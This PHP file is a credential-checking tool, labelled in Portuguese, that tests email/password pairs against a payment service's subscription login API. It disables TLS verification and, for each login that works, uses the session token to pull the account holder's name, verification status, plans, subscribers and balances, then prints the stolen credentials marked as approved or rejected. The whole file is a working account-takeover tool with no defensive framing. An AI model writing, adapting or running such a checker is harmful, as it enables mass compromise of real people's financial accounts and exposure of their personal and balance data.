<?php

function multiexplode($delimiters, $string) {
    $ready = str_replace($delimiters, $delimiters[0], $string);
    $launch = explode($delimiters[0], $ready);
    return $launch;
}

$lista = $_GET['lista'];
	$explode = multiexplode(array(";", "»", "|", ":", " ", "/"), $lista);
	$explode = array_values(array_filter($explode));
	@$email = trim($explode[0]);
	@$senha = trim($explode[1]);


function getstr ($url, $inicio, $fim){
   $str = explode ($inicio, $url);
   $str = explode ($fim, $str [1]);
   return $str[0];

}
$ch = curl_init ('https://assinatura.picpay.com/api/v1/login');
curl_setopt ($ch , CURLOPT_RETURNTRANSFER,1);
curl_setopt ($ch , CURLOPT_FOLLOWLOCATION,1);
curl_setopt ($ch , CURLOPT_HTTPHEADER,arraY ('accept: application/json, text/plain, */*','authorization: Bearer null','content-type: application/json'));
curl_setopt ($ch , CURLOPT_ENCODING,'GZIP');
curl_setopt ($ch , CURLOPT_SSL_VERIFYPEER,0);
curl_setopt ($ch , CURLOPT_SSL_VERIFYHOST,0);
curl_setopt ($ch, CURLOPT_POSTFIELDS,'{"email":"'. $email.'","password":"'. $senha.'"}');
$entra= curl_exec ($ch);

$res = getstr ($entra,'"message":"','"');
$token = getstr ($entra,'"token":"','"');



if (strpos ($entra,'"token":"')!==false){
 $ch = curl_init ('https://assinatura.picpay.com/api/v1/details');
curl_setopt ($ch , CURLOPT_RETURNTRANSFER,1);
curl_setopt ($ch , CURLOPT_FOLLOWLOCATION,1);
curl_setopt ($ch , CURLOPT_HTTPHEADER,arraY ('accept: application/json, text/plain, */*','authorization: Bearer '. $token.'','content-type: application/json'));
curl_setopt ($ch , CURLOPT_ENCODING,'GZIP');
$dados= curl_exec ($ch);

//echo $dados;
$nome = getstr ($dados,'"name":"','"');
$an_status = getstr ($dados,'"analysis_status":"','"');
$planos = getstr ($dados,'"active_plans":',',');
$inscritos = getstr ($dados,'"subscriptions":','},');
$saldo = getstr ($dados,'"available_balance":',',');
$retido = getstr ($dados,'"withheld_balance":',',');
$receber = getstr ($dados,'"expected_next_month":','}}');

 echo "#Aprovada $email | $senha INFOR [ NOME: $nome STATUS: $an_status PLANOS: $planos INSCRITOS: $inscritos SALDO: $saldo  RETIDO: $retido A RECEBER: $recebe ]";
 }else {
 echo "#Reprovada $email | $senha  Retorno: ($res)";
}



?>